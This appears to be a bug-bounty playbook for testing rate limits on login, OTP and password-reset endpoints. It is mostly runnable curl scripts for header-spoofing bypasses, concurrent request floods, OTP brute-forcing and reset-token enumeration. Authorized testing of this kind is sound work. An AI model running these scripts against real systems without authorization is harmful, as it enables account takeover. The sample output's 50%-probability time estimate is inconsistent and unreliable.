# Playbook: Rate Limit Testing

## Purpose
Identify missing or bypassable rate limiting on authentication, OTP,
password reset, and sensitive API endpoints.
Input: specific endpoint URL + expected rate-limited behavior.

---

## Step 1 — Identify High-Value Endpoints to Test

```bash
# Prioritize these endpoint types (highest bounty impact):
PRIORITY_ENDPOINTS=(
  "/login"          # Credential brute-force
  "/forgot-password" "/reset-password"  # Account takeover
  "/api/auth/otp"   "/verify-2fa"       # 2FA bypass
  "/api/register"   "/signup"           # Account enumeration + spam
  "/api/send-email" "/api/send-sms"     # SMS/email bombing
  "/api/verify"     "/verify-email"     # Token brute-force
  "/api/checkout"   "/api/payment"      # Transaction abuse
  "/api/search"     "/api/query"        # Resource exhaustion
)
```

---

## Step 2 — Baseline Test (Establish Normal Behavior)

```bash
ENDPOINT="https://TARGET/api/login"

# Send 5 requests with wrong credentials and observe responses
for i in $(seq 5); do
  response=$(curl -sk -X POST "$ENDPOINT" \
    -H "Content-Type: application/json" \
    -d '{"email":"test@test.com","password":"wrongpassword"}' \
    -w "\nHTTP_STATUS:%{http_code}\nRESPONSE_TIME:%{time_total}")
  echo "Request $i: $(echo "$response" | grep -E 'HTTP_STATUS|RESPONSE_TIME')"
  echo "Body: $(echo "$response" | head -1 | python3 -m json.tool 2>/dev/null)"
done
```

---

## Step 3 — Rate Limit Detection

```bash
ENDPOINT="https://TARGET/api/login"
DELAY=0.1  # 100ms between requests

# Send 30 rapid requests and track status codes
for i in $(seq 30); do
  status=$(curl -sk -X POST "$ENDPOINT" \
    -H "Content-Type: application/json" \
    -d '{"email":"test@test.com","password":"test"}' \
    -o /dev/null -w "%{http_code}")
  echo "Request $i: $status"
  sleep $DELAY
done | tee rate_test_results.txt

# Check if 429 was returned
grep -c "429" rate_test_results.txt && echo "RATE LIMITED" || echo "NO RATE LIMIT DETECTED"

# Check at what request rate limiting kicked in
grep -n "429" rate_test_results.txt | head -1
```

---

## Step 4 — Rate Limit Bypass Techniques

If rate limiting is detected, attempt these bypasses:

### IP Rotation via Headers
```bash
# Many apps trust X-Forwarded-For for client IP
BYPASS_HEADERS=(
  "X-Forwarded-For: 1.1.1.1"
  "X-Forwarded-For: 2.2.2.2"
  "X-Real-IP: 3.3.3.3"
  "X-Originating-IP: 4.4.4.4"
  "X-Remote-IP: 5.5.5.5"
  "X-Client-IP: 6.6.6.6"
  "True-Client-IP: 7.7.7.7"
  "CF-Connecting-IP: 8.8.8.8"
)

for i in "${!BYPASS_HEADERS[@]}"; do
  ip="$((i+100)).$((i+100)).$((i+100)).$((i+100))"
  header_name=$(echo "${BYPASS_HEADERS[$i]}" | cut -d: -f1)
  
  status=$(curl -sk -X POST "$ENDPOINT" \
    -H "Content-Type: application/json" \
    -H "$header_name: $ip" \
    -d '{"email":"test@test.com","password":"test"}' \
    -o /dev/null -w "%{http_code}")
  echo "$header_name: $ip → $status"
done
```

### Username Normalization (for login endpoints)
```bash
# Email variations that may count as different users
EMAILS=(
  "test@target.com"
  "TEST@target.com"
  "Test@target.com"
  "test+1@target.com"
  "test+2@target.com"
  " test@target.com"    # leading space
  "test @target.com"    # trailing space
  "te st@target.com"    # internal space (some parsers strip)
)

for email in "${EMAILS[@]}"; do
  status=$(curl -sk -X POST "$ENDPOINT" \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"$email\",\"password\":\"wrong\"}" \
    -o /dev/null -w "%{http_code}")
  echo "[$status] $email"
done
```

### Race Condition (concurrent requests)
```bash
# Send many requests simultaneously — may bypass sequential rate limiting
for i in $(seq 50); do
  curl -sk -X POST "$ENDPOINT" \
    -H "Content-Type: application/json" \
    -d '{"email":"victim@target.com","password":"test"}' \
    -o /dev/null &
done
wait
```

### Null Byte / Parameter Pollution
```bash
# Add extra parameters that may confuse rate limit tracking
curl -sk -X POST "$ENDPOINT" \
  -H "Content-Type: application/json" \
  -d '{"email":"test@test.com\u0000","password":"test"}'

curl -sk -X POST "${ENDPOINT}?email=test@test.com" \
  -H "Content-Type: application/json" \
  -d '{"email":"test@test.com","password":"test"}'
```

---

## Step 5 — OTP / 2FA Brute-Force Assessment

```bash
# OTP endpoint test — 6-digit code = 1,000,000 possibilities
# Test rate limit on OTP verification
OTP_ENDPOINT="https://TARGET/api/verify-otp"
SESSION="partial_auth_session_after_password"

# How many attempts before lockout?
for code in 000000 000001 000002 000003 000004 000005 000006 000007 000008 000009; do
  response=$(curl -sk -X POST "$OTP_ENDPOINT" \
    -H "Cookie: session=$SESSION" \
    -H "Content-Type: application/json" \
    -d "{\"otp\": \"$code\"}" \
    -w "\nHTTP:%{http_code}")
  echo "OTP $code: $(echo "$response" | grep HTTP)"
  sleep 0.1
done

# Calculate brute-force feasibility:
python3 -c "
attempts = 10          # attempts before lockout
delay = 0.1           # seconds between attempts
total_codes = 1000000 # 6 digits
if attempts >= total_codes:
    print('NO LOCKOUT — brute force feasible')
else:
    print(f'Lockout after {attempts} attempts — brute force NOT feasible at 1 code/100ms')
    expected_time = (total_codes / attempts) * delay
    print(f'Would take {expected_time:.0f} seconds across account unlocks')
"
```

---

## Step 6 — Password Reset Token Enumeration

```bash
# If reset tokens are numeric or short:
RESET_ENDPOINT="https://TARGET/reset-password"

# Check token length and character set from one real token
# If token is 6 digits: 1,000,000 possibilities
# If token is 8 hex chars: 4,294,967,296 possibilities

# Test rate limit on token verification
TOKEN_BASE="1234"
for suffix in $(seq -w 00 20); do
  status=$(curl -sk -X POST "$RESET_ENDPOINT" \
    -d "token=${TOKEN_BASE}${suffix}&password=NewPass123" \
    -o /dev/null -w "%{http_code}")
  echo "Token ${TOKEN_BASE}${suffix}: $status"
done
```

---

## Step 7 — Assess Business Impact

```bash
# Estimate brute-force feasibility
python3 -c "
import math

# Parameters
space = 94**8        # 8-char mixed password
rate = 100           # requests per second (no rate limit)
time_seconds = space / rate
time_days = time_seconds / 86400

print(f'Password space: {space:,}')
print(f'At {rate} req/s: {time_days:.0f} days to exhaust')

# OTP 6-digit
space_otp = 10**6
rate_otp = 100
time_otp = space_otp / rate_otp
print(f'\nOTP 6-digit at {rate_otp} req/s: {time_otp:.0f} seconds = {time_otp/60:.1f} minutes')
"
```

---

## Output

```
ENDPOINT      : POST /api/auth/verify-otp
TEST TYPE     : OTP brute-force rate limit
─────────────────────────────────────────────────────
BASELINE      : Returns 401 for wrong OTP, 200 for correct
RATE LIMIT    : NOT DETECTED after 100 attempts
BYPASS TESTED : N/A (no rate limit to bypass)

FEASIBILITY:
  OTP space   : 1,000,000 (6-digit numeric)
  Rate        : 100 req/s (tested — no throttle)
  Time to brute: ~10,000 seconds (~2.8 hours) for 50% probability
  Lockout     : None observed after 100 attempts

SEVERITY      : HIGH
IMPACT        : Any valid user session post-password-entry can have their 2FA
                bypassed by brute-forcing the OTP within a 2-3 hour window.
                No CAPTCHA, no lockout, no alert mechanism observed.

EVIDENCE      : [show 100 sequential OTP attempts all returning 401 — not 429]

NEXT STEP     : Load 03_reporting/report_writer.md
```
